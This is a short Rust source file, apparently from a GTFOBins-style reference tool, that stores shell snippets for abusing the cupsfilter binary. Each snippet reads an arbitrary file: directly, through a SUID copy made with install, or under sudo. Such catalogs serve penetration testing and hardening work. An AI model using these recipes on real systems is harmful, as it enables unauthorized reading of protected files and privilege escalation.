
pub static BIN_NAME: &'static str = "cupsfilter";
pub static FR_CODE: &'static str = r#"
    
    LFILE=file_to_read
    cupsfilter -i application/octet-stream -m application/octet-stream $LFILE
"#;
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which cupsfilter) .

    LFILE=file_to_read
    ./cupsfilter -i application/octet-stream -m application/octet-stream $LFILE
"#;
pub static SUDO_CODE: &'static str = r#"
    
    LFILE=file_to_read
    sudo cupsfilter -i application/octet-stream -m application/octet-stream $LFILE
"#;
use crate::code::{Code, Tag};
pub static FR: Code<'static> = Code { 
	title: "FR_CODE",
	code: FR_CODE,
	tag: Tag::FR,
};
pub static SUID: Code<'static> = Code { 
	title: "SUID_CODE",
	code: SUID_CODE,
	tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
